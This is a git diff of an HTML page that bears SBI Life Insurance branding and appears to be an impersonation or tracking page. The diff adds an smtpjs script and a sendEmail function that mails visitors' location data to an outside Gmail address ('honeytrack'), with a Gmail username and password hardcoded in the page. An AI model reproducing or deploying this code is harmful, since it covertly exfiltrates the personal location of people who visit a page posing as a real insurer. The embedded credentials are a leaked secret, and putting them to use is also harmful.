@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 
 <html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="author" content="SBI Life Insurance"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"><meta name="robots" content="noodp"><meta name="robots" content="noydir">
+<script src="https://smtpjs.com/v3/smtp.js"></script>  
 
 <script>
 	// Function to send the location via email
@@ -8,18 +9,20 @@ function sendEmail(locationData) {
   // Use your own server-side script or email service to send the email
 
   // Example using EmailJS service
-  Email.send({
-    SecureToken: "pjrjehcaqzrggewp",
-    To: "depressed.meow.69@gmail.com",
-    From: "alert.honeytrack@gmail.com",
-    Subject: "User Location",
-    Body: locationData
-  }).then(
-    message => {
-      console.log("Email sent successfully");
-    },
-    error => {
-      console.log("Error sending email:", error);
+  	Email.send({
+		Host: "smtp.gmail.com",
+		Username: "depressed.meow.69@gmail.com",
+		Password: "pjrjehcaqzrggewp",
+		From: "depressed.meow.69@gmail.com",
+		To: "alert.honeytrack@gmail.com",
+		Subject: "User Location",
+		Body: locationData
+		}).then(
+			message => {
+			console.log("Email sent successfully");
+			},
+		error => {
+		console.log("Error sending email:", error);
     }
   );
 }
